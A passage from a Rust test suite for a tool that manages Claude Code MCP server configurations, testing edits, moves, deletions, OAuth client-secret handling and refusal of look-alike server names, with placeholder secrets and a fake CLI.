            env.runs(&["mcp", "get", "ab"]),
            1,
            "\"ab\" itself was not checked again"
        );
    }

    #[test]
    fn servers_with_an_empty_project_key_or_name_can_still_be_changed() {
        // Review of the fix: decoding the keyring id lost an empty project ("" became none) and refused an empty
        // name, so these could no longer be changed, and the local "x" was shown as the user "x".
        let env = quiet_env(&serde_json::json!({
            "mcpServers": {"x": {"command": "user-x"}, "": {"command": "junk"}},
            "projects": {"": {"mcpServers": {"x": {"command": "local-x"}}}, "/work/a": {}}
        }));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        let local_x = ServerId::new(Scope::Local, Some(""), "x");
        let (json, editable) = entry_of(&core, local_x.clone());
        assert!(json.unwrap().contains("local-x"));
        assert!(editable);
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_x,
                enabled: false,
            }],
        );
        apply_and_wait(&core, &plan);
        assert_eq!(disabled_list(&env, ""), serde_json::json!(["x"]));
        let plan = plan_for(&core, vec![Change::Delete { id: user_id("") }]);
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        assert!(now["mcpServers"].get("").is_none());
        assert_eq!(
            now["mcpServers"]["x"],
            serde_json::json!({"command": "user-x"})
        );
    }

    #[test]
    fn the_review_names_the_server_that_is_changed() {
        // An id is matched by its connection alone, so its other fields must not reach what the user reads.
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let mut id = user_id("gw");
        id.name = "github".into();
        id.scope = Scope::Project;
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: id.clone(),
                enabled: false,
            }],
        );
        assert_eq!(plan.summary, ["Turn off gw in 2 projects"]);
        // And the definition shown is the row's, with the row's scope deciding whether it can be edited.
        let (json, editable) = entry_of(&core, id);
        assert!(json.unwrap().contains("node"));
        assert!(
            editable,
            "a user server, whatever the caller's copy of its scope says"
        );
    }

    #[test]
    fn duplicate_compares_names_and_projects_as_the_file_spells_them() {
        let hidden = "a\u{202e}b";
        let long = format!("/work/{}", "y".repeat(600));
        let env = quiet_env(&serde_json::json!({
            "mcpServers": {"gw": {"command": "node"}, hidden: {"command": "y"}},
            "projects": {long.clone(): {"mcpServers": {"x": {"command": "x"}}}}
        }));
        let core = env.start();
        // Only a look-alike exists: "ab" is free.
        let plan = plan_for(
            &core,
            vec![Change::Duplicate {
                id: user_id("gw"),
                name: "ab".into(),
                targets: vec![Target::User],
            }],
        );
        assert!(!plan.nothing_to_do);
        // A project whose key is cut for display still has its "x".
        let refused = plan_failure(
            &core,
            vec![Change::Duplicate {
                id: user_id("gw"),
                name: "x".into(),
                targets: vec![Target::Local(long)],
            }],
        );
        // Said before anything is read (the write would refuse it too, less plainly).
        assert!(
            refused.contains("There is already a server called x in"),
            "{refused}"
        );
    }

    #[test]
    fn a_project_server_whose_name_cannot_be_shown_exactly_is_not_approved() {
        // Review of the fix: the raw name was approved while the review showed the cleaned one.
        let (env, key, repo) = repo_env(serde_json::json!({}));
        std::fs::write(
            repo.join(".mcp.json"),
            r#"{"mcpServers":{"git\u200bhub":{"command":"node","args":["s.js"]}}}"#,
        )
        .unwrap();
        let core = env.start();
        let refused = plan_failure(
            &core,
            vec![Change::Approve {
                id: project_id(&key, "git\u{200b}hub"),
            }],
        );
        assert!(refused.contains("cannot be shown exactly"), "{refused}");
        assert!(!repo.join(".claude").exists());
    }

    #[test]
    fn deleting_a_local_server() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::Delete {
                id: local_id("loc", "/work/a"),
            }],
        );
        apply_and_wait(&core, &plan);
        assert_eq!(
            config_json(&env)["projects"]["/work/a"]["mcpServers"],
            serde_json::json!({})
        );
        verify_passes(&core);
    }

    #[test]
    fn editing_round_trips_through_the_hidden_view_and_keeps_the_secret() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let (json, _) = entry_of(&core, user_id("gw"));
        let edited = json.unwrap().replace("\"node\"", "\"node22\"");
        let plan = plan_for(
            &core,
            vec![Change::Replace {
                id: user_id("gw"),
                json: edited,
            }],
        );
        let shown = format!("{plan:?}");
        assert!(
            shown.contains("node22") && !shown.contains("s3cret-value"),
            "{shown}"
        );
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        assert_eq!(now["mcpServers"]["gw"]["command"], "node22");
        assert_eq!(now["mcpServers"]["gw"]["env"]["TOKEN"], "s3cret-value");
    }

    #[test]
    fn an_edit_that_is_not_valid_says_why_and_writes_nothing() {
        let env = quiet_env(&two_projects("end"));
        let before = config_json(&env);
        let core = env.start();
        for (json, why) in [
            ("{not json", "not valid JSON"),
            ("{\"type\": \"http\"}", "url"),
            (
                "{\"command\": \"x\", \"env\": {\"NEW\": \"<hidden>\"}}",
                "no value before",
            ),
        ] {
            let refused = plan_failure(
                &core,
                vec![Change::Replace {
                    id: user_id("gw"),
                    json: json.into(),
                }],
            );
            assert!(refused.contains(why), "{json}: {refused}");
        }
        assert_eq!(config_json(&env), before);
    }

    // ---- plain-language plans

    #[test]
    fn a_plan_says_in_words_what_it_does_and_what_the_button_does() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let off = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        assert_eq!(off.summary, ["Turn off gw in 2 projects"]);
        assert_eq!(off.action, "Turn off");
        assert!(!off.destructive);
        assert!(
            off.notes.iter().any(|n| n.contains("restart")),
            "{:?}",
            off.notes
        );
        assert!(
            !off.warnings.iter().any(|w| w.contains("restart")),
            "the restart hint is a note"
        );
        let delete = plan_for(
            &core,
            vec![Change::Delete {
                id: local_id("loc", "/work/a"),
            }],
        );
        assert_eq!(delete.summary, ["Delete loc in a"]);
        assert_eq!(delete.action, "Delete");
        assert!(delete.destructive);
        let mixed = plan_for(
            &core,
            vec![
                Change::SetEnabled {
                    id: local_id("loc", "/work/a"),
                    enabled: false,
                },
                Change::Delete { id: user_id("gw") },
            ],
        );
        assert_eq!(mixed.action, "Apply");
        assert_eq!(
            mixed.summary,
            ["Turn off loc in a", "Delete gw (user server)"]
        );
    }

    #[test]
    fn one_project_is_one_project() {
        let env = quiet_env(&serde_json::json!({
            "mcpServers": {"gw": {"type": "stdio", "command": "x"}},
            "projects": {"/work/only": {}}
        }));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        assert_eq!(plan.summary, ["Turn off gw in 1 project"]);
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("the 1 project it knows")),
            "{:?}",
            plan.warnings
        );
    }

    // ---- adding a server that signs in with OAuth, through Claude Code's own command

    const OAUTH_DEF: &str = r#"{"type": "http", "url": "https://sso.example.com/mcp", "headers": {"X-Team": "${TEAM}"}, "oauth": {"clientId": "client-7", "callbackPort": 8123}}"#;
    const CLIENT_SECRET: &str = "Client-S3cret-Value";

    fn oauth_add(name: &str, targets: Vec<Target>, secret: Option<&str>) -> Change {
        Change::Add {
            name: name.to_owned(),
            json: OAUTH_DEF.to_owned(),
            targets,
            secret: secret.map(|s| crate::secrets::Secret::new(s.to_owned())),
        }
    }

    /// Claude Code's `mcp add-json` takes a moment and then says it added the server; the test plays Claude's part
    /// and writes the entry while it runs, as the fake CLI cannot.
    const ADD_JSON_OK: &str = r#"{"rules":[
        {"args":["mcp","add-json"],"delay_ms":1500,"stdout_file":"added.txt"}]}"#;

    fn oauth_add_env(scenario: &str) -> (Env, String, PathBuf) {
        let env = Env::new(
            &serde_json::json!({}),
            scenario,
            &[
                ("added.txt", b"Added http MCP server sso2 to user config\n"),
                (
                    "exists.txt",
                    b"MCP server sso2 already exists in user config\n",
                ),
            ],
        );
        let repo = env.dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let key = repo.to_string_lossy().replace('\\', "/");
        write_config(
            &env,
            &serde_json::json!({"numStartups": 1, "projects": {key.clone(): {"mcpServers": {}}}}),
        );
        (env, key, repo)
    }

    impl Env {
        /// The `start` lines of every `mcp add-json` the fake CLI ran.
        fn add_json_runs(&self) -> Vec<serde_json::Value> {
            std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
                .filter(|l| l["event"] == "start" && l["argv"][1] == "add-json")
                .collect()
        }

        /// Waits until `mcp add-json` is running, then writes `entry` the way Claude Code would: in the user's list
        /// or the project's.
        fn claude_writes_when_asked(&self, project: Option<&str>, name: &str, entry: &str) {
            let deadline = Instant::now() + WAIT;
            while self.add_json_runs().is_empty() {
                assert!(Instant::now() < deadline, "add-json never ran");
                std::thread::sleep(Duration::from_millis(5));
            }
            let mut config = config_json(self);
            let entry: serde_json::Value = serde_json::from_str(entry).unwrap();
            match project {
                None => config["mcpServers"][name] = entry,
                Some(p) => config["projects"][p]["mcpServers"][name] = entry,
            }
            write_config(self, &config);
        }
    }

    fn sha256(text: &str) -> String {
        use sha2::Digest;
        format!("{:x}", sha2::Sha256::digest(text.as_bytes()))
    }

    // ---- moving a server that signs in, through Claude Code's own commands

    const SSO_ENTRY: &str = r#"{"type": "http", "url": "https://sso.example.com/mcp", "oauth": {"clientId": "client-7", "callbackPort": 8123}}"#;

    /// sso, for the user and signing in with OAuth, with Klefki's copy of its client secret; and an empty project.
    fn oauth_move_env(scenario: &str) -> (Env, Arc<crate::secrets::MemoryStore>, String, PathBuf) {
        let env = Env::new(
            &serde_json::json!({}),
            scenario,
            &[
                ("removed.txt", b"Removed MCP server sso from user config\n"),
                ("added.txt", b"Added http MCP server sso to local config\n"),
            ],
        );
        let repo = real(&env.dir.path().join("repo"));
        let key = repo.to_string_lossy().replace('\\', "/");
        let entry: serde_json::Value = serde_json::from_str(SSO_ENTRY).unwrap();
        write_config(
            &env,
            &serde_json::json!({"numStartups": 1, "mcpServers": {"sso": entry}, "projects": {key.clone(): {}}, "tail": 1}),
        );
        let store = Arc::new(crate::secrets::MemoryStore::default());
        store
            .set(
                &crate::model::ConnectionId::new(Scope::User, None, "sso"),
                &crate::secrets::Secret::new(CLIENT_SECRET.to_owned()),
            )
            .unwrap();
        (env, store, key, repo)
    }

    impl Env {
        /// The `start` lines of every command the fake CLI ran, as (argv, cwd, secret hash).
        fn changes_run(&self) -> Vec<(Vec<String>, String, Option<String>)> {
            std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
                .filter(|l| l["event"] == "start" && l["argv"][0] == "mcp" && l["argv"][1] != "get")
                .map(|l| {
                    (
                        l["argv"]
                            .as_array()
                            .unwrap()
                            .iter()
                            .map(|a| a.as_str().unwrap().to_owned())
                            .collect(),
                        l["cwd"].as_str().unwrap_or_default().to_owned(),
                        l["secret_sha256"].as_str().map(str::to_owned),
                    )
                })
                .collect()
        }

        /// Waits until the `n`th change command (`mcp remove` or `mcp add-json`) has started.
        fn wait_for_run(&self, n: usize) {
            let deadline = Instant::now() + WAIT;
            while self.changes_run().len() < n {
                assert!(
                    Instant::now() < deadline,
                    "run {n} never started: {:?}",
                    self.changes_run()
                );
                std::thread::sleep(Duration::from_millis(5));
            }
        }
    }

    /// Makes the folder `path` and spells it as Claude Code keys a project: the folder itself, not a link to it
    /// (macOS's temporary folder is one).
    fn real(path: &Path) -> PathBuf {
        std::fs::create_dir_all(path).unwrap();
        #[cfg(unix)]
        return std::fs::canonicalize(path).unwrap();
        #[cfg(not(unix))]
        return path.to_path_buf();
    }

    /// Moves sso for the user to the project; Claude Code's remove works (the test plays its part) and every add
    /// fails, so putting it back fails too and Klefki keeps its definition. Returns the kept definition's id.
    fn keep_sso(env: &Env, core: &Core, key: &str) -> String {
        let plan = plan_for(
            core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key.to_owned()),
            }],
        );
        core.send(Command::Apply(plan.id));
        env.wait_for_run(1);
        let mut config = config_json(env);
        config["mcpServers"].as_object_mut().unwrap().remove("sso");
        write_config(env, &config);
        let events = collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap_or_else(|| panic!("{events:#?}"));
        assert!(error.contains("Klefki kept"), "{error}");
        let kept = &snapshots(&events).last().unwrap().kept;
        assert_eq!(kept.len(), 1, "{kept:?}");
        kept[0].id.clone()
    }

    const REMOVE_THEN_ADDS_FAIL: &str = r#"{"rules":[
        {"args":["mcp","remove"],"delay_ms":600,"stdout_file":"removed.txt"},
        {"args":["mcp","add-json"],"exit_code":1,"stdout_file":"failed.txt"}]}"#;

    #[test]
    fn a_failed_move_that_removed_the_server_is_logged_with_its_backups() {
        // Cross-review of the activity log, B1: the move's backups were dropped on failure, so the change was not
        // logged and its backup showed as one from before the log.
        let (env, store, key, _) = oauth_move_env(REMOVE_THEN_ADDS_FAIL);
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        keep_sso(&env, &core, &key);
        let log = activity(&core);
        let [entry] = &log.entries[..] else {
            panic!("one entry, every backup in it: {log:#?}");
        };
        assert_eq!(entry.summary.len(), 1, "{log:#?}");
        assert!(
            entry
                .failed
                .as_deref()
                .is_some_and(|e| e.contains("Klefki kept")),
            "{log:#?}"
        );
        assert!(!entry.backups.is_empty());
    }

    #[test]
    fn a_plain_move_logs_every_backup_it_made() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("gw"),
                to: Target::Local("/work/a".to_owned()),
            }],
        );
        assert!(!plan.nothing_to_do, "{plan:?}");
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. })),
            "{events:#?}"
        );
        let log = activity(&core);
        let [entry] = &log.entries[..] else {
            panic!("one entry, every backup in it: {log:#?}");
        };
        assert_eq!(entry.failed, None);
        assert!(!entry.backups.is_empty(), "{log:#?}");
    }

    #[test]
    fn a_kept_definition_can_be_put_back() {
        // Cross-review B1: the plan looked for the kept definition in a fresh read of the configuration, which
        // never lists them, so Put back always said it was gone.
        let (env, store, key, _) = oauth_move_env(REMOVE_THEN_ADDS_FAIL);
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let kept = keep_sso(&env, &core, &key);
        assert!(config_json(&env)["mcpServers"].get("sso").is_none());
        // Claude Code works again.
        write_scenario(
            env.dir.path(),
            r#"{"rules":[{"args":["mcp","add-json"],"delay_ms":600,"stdout_file":"added.txt"}]}"#,
            &[],
        );
        let plan = plan_for(&core, vec![Change::PutBack { kept: kept.clone() }]);
        assert_eq!(plan.summary, ["Put back sso for the user"]);
        let runs = env.changes_run().len();
        core.send(Command::Apply(plan.id));
        env.wait_for_run(runs + 1);
        let mut config = config_json(&env);
        config["mcpServers"]["sso"] = serde_json::from_str(SSO_ENTRY).unwrap();
        write_config(&env, &config);
        let events = collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. })),
            "{events:#?}"
        );
        assert!(snapshots(&events).last().unwrap().kept.is_empty());
        let last = &env.changes_run()[runs];
        assert_eq!(
            last.0[..5],
            ["mcp", "add-json", "-s", "user", "--client-secret"]
        );
        assert_eq!(last.2.as_deref(), Some(sha256(CLIENT_SECRET).as_str()));
    }

    #[test]
    fn a_kept_definitions_client_secret_is_not_offered_to_forget() {
        // Put back hands the kept secret to Claude Code again, so it is in use although sso is in no file now.
        let (env, store, key, _) = oauth_move_env(REMOVE_THEN_ADDS_FAIL);
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        keep_sso(&env, &core, &key);
        let sso = user_id("sso").connection;
        assert!(store.get(&sso).unwrap().is_some());
        let report = secrets_report(&core);
        assert!(report.unused.is_empty(), "{report:?}");
        core.send(Command::ForgetUnusedSecret(sso.clone()));
        let refused = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Secrets(_))))
            .into_iter()
            .find_map(|e| match e {
                Event::UnusedSecretForgotten { result, .. } => Some(result),
                _ => None,
            })
            .unwrap();
        assert!(refused.is_err());
        assert!(store.get(&sso).unwrap().is_some());
    }

    #[test]
    fn a_kept_definition_can_be_forgotten() {
        // The variant: Forget, which also said it was gone.
        let (env, store, key, _) = oauth_move_env(REMOVE_THEN_ADDS_FAIL);
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let kept = keep_sso(&env, &core, &key);
        let plan = plan_for(&core, vec![Change::ForgetKept { kept }]);
        assert!(plan.destructive);
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. })),
            "{events:#?}"
        );
        assert!(snapshots(&events).last().unwrap().kept.is_empty());
    }

    #[test]
    fn a_definition_put_back_without_some_settings_is_listed_as_back() {
        // Cross-review round 2: put back, but without alwaysAllow, the notice still said it was out of the
        // configuration, and Put back again failed with "sso already exists there".
        let (env, store, key, _) = oauth_move_env(
            r#"{"rules":[
            {"args":["mcp","remove"],"delay_ms":600,"stdout_file":"removed.txt"},
            {"args":["mcp","add-json","-s","local"],"exit_code":1,"stdout_file":"failed.txt"},
            {"args":["mcp","add-json","-s","user"],"delay_ms":600,"stdout_file":"added.txt"}]}"#,
        );
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let mut config = config_json(&env);
        config["mcpServers"]["sso"]["alwaysAllow"] = serde_json::json!(["search"]);
        write_config(&env, &config);
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key),
            }],
        );
        core.send(Command::Apply(plan.id));
        env.wait_for_run(1);
        let mut config = config_json(&env);
        config["mcpServers"].as_object_mut().unwrap().remove("sso");
        write_config(&env, &config);
        // Claude Code puts it back as it writes it: without alwaysAllow.
        env.wait_for_run(3);
        let mut config = config_json(&env);
        config["mcpServers"]["sso"] = serde_json::from_str(SSO_ENTRY).unwrap();
        write_config(&env, &config);
        let events = collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap_or_else(|| panic!("{events:#?}"));
        assert!(error.contains("left out alwaysAllow"), "{error}");
        assert!(!error.contains("put that back"), "{error}");
        let kept = &snapshots(&events).last().unwrap().kept;
        assert_eq!(kept.len(), 1, "{kept:?}");
        assert!(kept[0].back, "{kept:?}");
        // The variant: one that is not back is not listed as back.
        let (env, store, key, _) = oauth_move_env(REMOVE_THEN_ADDS_FAIL);
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        keep_sso(&env, &core, &key);
        core.send(Command::Refresh { live_all: false });
        let events = collect(&core, |e| !snapshots(e).is_empty());
        assert!(!snapshots(&events).last().unwrap().kept[0].back);
    }

    #[test]
    fn a_move_into_a_missing_folder_is_refused_before_anything_runs() {
        // Cross-review B2: the folder was checked only when the add ran, after the remove had signed sso out.
        let (env, store, key, repo) =
            oauth_move_env(r#"{"rules":[{"args":["mcp","remove"],"stdout_file":"removed.txt"}]}"#);
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        std::fs::remove_dir(&repo).unwrap();
        let refused = plan_failure(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key.clone()),
            }],
        );
        assert!(refused.contains("is not there"), "{refused}");
        // Gone after the review: stopped before the remove.
        std::fs::create_dir(&repo).unwrap();
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key),
            }],
        );
        std::fs::remove_dir(&repo).unwrap();
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap_or_else(|| panic!("{events:#?}"));
        assert!(error.contains("Nothing was changed"), "{error}");
        assert!(env.changes_run().is_empty(), "{:?}", env.changes_run());
        assert!(config_json(&env)["mcpServers"].get("sso").is_some());
    }

    #[test]
    fn a_move_out_of_a_missing_folder_is_refused_before_anything_runs() {
        // The variant: the folder the server is in is gone.
        let (env, store, key, repo) = oauth_move_env(r#"{"rules":[]}"#);
        let mut config = config_json(&env);
        let sso = config["mcpServers"]["sso"].take();
        config["mcpServers"] = serde_json::json!({});
        config["projects"][&key]["mcpServers"] = serde_json::json!({ "sso": sso });
        write_config(&env, &config);
        store
            .set(
                &crate::model::ConnectionId::new(Scope::Local, Some(&key), "sso"),
                &crate::secrets::Secret::new(CLIENT_SECRET.to_owned()),
            )
            .unwrap();
        std::fs::remove_dir(&repo).unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let refused = plan_failure(
            &core,
            vec![Change::Move {
                id: local_id("sso", &key),
                to: Target::User,
            }],
        );
        assert!(refused.contains("is not there"), "{refused}");
        assert!(env.changes_run().is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn a_project_reached_through_a_link_is_refused_before_anything_runs() {
        // Cross-review S3: Claude Code files a local server under the folder itself, so one added from a link
        // would land under another key, and Klefki would not find it.
        let (env, store, _, repo) = oauth_move_env(r#"{"rules":[]}"#);
        let link = env.dir.path().join("link");
        std::os::unix::fs::symlink(&repo, &link).unwrap();
        let key = link.to_string_lossy().into_owned();
        let mut config = config_json(&env);
        config["projects"][&key] = serde_json::json!({});
        write_config(&env, &config);
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let refused = plan_failure(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key),
            }],
        );
        assert!(refused.contains("through a link"), "{refused}");
        assert!(env.changes_run().is_empty());
    }

    #[test]
    fn the_review_shows_what_claude_code_writes_and_warns_what_it_drops() {
        // Cross-review B3: the diff showed alwaysAllow kept, and Claude Code dropped it.
        let (env, store, key, _) = oauth_move_env(r#"{"rules":[]}"#);
        let mut config = config_json(&env);
        config["mcpServers"]["sso"]["alwaysAllow"] = serde_json::json!(["search"]);
        write_config(&env, &config);
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key),
            }],
        );
        let shown: Vec<&String> = plan.files.iter().flat_map(|f| &f.lines).collect();
        assert!(
            !shown.iter().any(|l| l.contains("alwaysAllow")),
            "{shown:?}"
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("loses alwaysAllow")),
            "{:?}",
            plan.warnings
        );
        // The costliest first: signing in again, before the scope and the dropped settings (cross-review round 2).
        assert!(
            plan.warnings[0].contains("sign in to it again"),
            "{:?}",
            plan.warnings
        );
        // The variant: an edit in place.
        let mut edited: serde_json::Value = serde_json::from_str(SSO_ENTRY).unwrap();
        edited["url"] = serde_json::json!("https://sso.example.com/v2");
        edited["alwaysAllow"] = serde_json::json!(["search"]);
        let plan = plan_for(
            &core,
            vec![Change::Replace {
                id: user_id("sso"),
                json: edited.to_string(),
            }],
        );
        let shown: Vec<&String> = plan.files.iter().flat_map(|f| &f.lines).collect();
        assert!(
            !shown
                .iter()
                .any(|l| l.contains("+") && l.contains("alwaysAllow")),
            "{shown:?}"
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("loses alwaysAllow"))
        );
    }

    #[test]
    fn a_kept_definition_whose_change_got_through_is_not_offered() {
        // Cross-review S1: Klefki stopped after the add but before deleting the recovery file. The next listing
        // must not offer to put back a server that was moved after all.
        let (env, store, key, _) = oauth_move_env(REMOVE_THEN_ADDS_FAIL);
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        keep_sso(&env, &core, &key);
        // The move landed after all, and Klefki's copy of the client secret went along (as if Klefki stopped
        // before it could tidy up).
        let mut config = config_json(&env);
        config["projects"][&key]["mcpServers"] = serde_json::json!({"sso": serde_json::from_str::<serde_json::Value>(SSO_ENTRY).unwrap()});
        write_config(&env, &config);
        let (from, to) = (
            crate::model::ConnectionId::new(Scope::User, None, "sso"),
            crate::model::ConnectionId::new(Scope::Local, Some(&key), "sso"),
        );
        store
            .set(&to, &crate::secrets::Secret::new(CLIENT_SECRET.to_owned()))
            .unwrap();
        core.send(Command::Refresh { live_all: false });
        // A refresh the watcher started before the write above can still come first, and rightly lists it as kept.
        let events = collect(&core, |e| snapshots(e).iter().any(|s| s.kept.is_empty()));
        assert!(snapshots(&events).last().unwrap().kept.is_empty());
        assert_eq!(
            std::fs::read_dir(env.dir.path().join("recovery"))
                .map(|d| d.count())
                .unwrap_or(0),
            0
        );
        // The copy left where it was is deleted, for a server put there later not to claim it.
        assert!(store.get(&from).unwrap().is_none());
        assert!(store.get(&to).unwrap().is_some());
    }

    #[test]
    fn a_kept_definition_whose_change_got_through_without_its_client_secret_is_still_offered() {
        // The variant: the server is where it was going, but Klefki's copy of its client secret is not, so nothing
        // shows Claude Code has it. Putting it back is the only way left to hand it over, so it is still offered.
        let (env, store, key, _) = oauth_move_env(REMOVE_THEN_ADDS_FAIL);
        std::fs::write(env.dir.path().join("failed.txt"), "simulated failure").unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let kept = keep_sso(&env, &core, &key);
        let mut config = config_json(&env);
        config["projects"][&key]["mcpServers"] = serde_json::json!({"sso": serde_json::from_str::<serde_json::Value>(SSO_ENTRY).unwrap()});
        write_config(&env, &config);
        core.send(Command::Refresh { live_all: false });
        let events = collect(&core, |e| !snapshots(e).is_empty());
        let listed = &snapshots(&events).last().unwrap().kept;
        assert_eq!(listed.iter().map(|k| &k.id).collect::<Vec<_>>(), [&kept]);
        let from = crate::model::ConnectionId::new(Scope::User, None, "sso");
        assert!(store.get(&from).unwrap().is_some());
    }

    #[test]
    fn a_slow_change_says_what_claude_code_is_doing() {
        // Cross-review S4: a swap runs two or three of Claude Code's commands, seconds each.
        let (env, store, key, _) =
            oauth_move_env(r#"{"rules":[{"args":["mcp","remove"],"stdout_file":"removed.txt"}]}"#);
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key),
            }],
        );
        let events = apply_and_wait(&core, &plan);
        let steps: Vec<&String> = events
            .iter()
            .filter_map(|e| match e {
                Event::Applying { plan: p, step } if *p == plan.id => Some(step),
                _ => None,
            })
            .collect();
        assert_eq!(steps, ["Claude Code is removing sso for the user\u{2026}"]);
    }

    #[test]
    fn moving_a_user_server_into_one_project_says_where_it_is_no_longer() {
        // Cross-review S5.
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("gw"),
                to: Target::Local("/work/b".into()),
            }],
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w == "gw will only be in b: it is no longer there for you in a."),
            "{:?}",
            plan.warnings
        );
    }

    #[test]
    fn moving_into_a_project_where_it_is_switched_off_says_it_stays_off() {
        // Cross-review round 2: the move landed it switched off in the one place chosen, with no word of it.
        let mut config = two_projects("end");
        config["projects"]["/work/b"]["disabledMcpServers"] = serde_json::json!(["other", "gw"]);
        let env = quiet_env(&config);
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("gw"),
                to: Target::Local("/work/b".into()),
            }],
        );
        assert!(
            plan.warnings.iter().any(|w| w
                == "gw is switched off in b, so it stays off there. Switch it on there to use it."),
            "{:?}",
            plan.warnings
        );
        // The variant: a copy there; and nothing said where it is on.
        let plan = plan_for(
            &core,
            vec![Change::Duplicate {
                id: user_id("gw"),
                name: "gw".into(),
                targets: vec![Target::Local("/work/b".into())],
            }],
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("switched off in b")),
            "{:?}",
            plan.warnings
        );
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("gw"),
                to: Target::Local("/work/a".into()),
            }],
        );
        assert!(
            !plan.warnings.iter().any(|w| w.contains("switched off")),
            "{:?}",
            plan.warnings
        );
    }

    fn same_dir(a: &str, b: &Path) -> bool {
        std::fs::canonicalize(a).ok() == std::fs::canonicalize(b).ok()
    }

    #[test]
    fn an_oauth_server_is_moved_by_claude_code_and_keeps_its_client_secret() {
        let (env, store, key, repo) = oauth_move_env(
            r#"{"rules":[
                {"args":["mcp","remove"],"delay_ms":800,"stdout_file":"removed.txt"},
                {"args":["mcp","add-json"],"delay_ms":800,"stdout_file":"added.txt"}]}"#,
        );
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
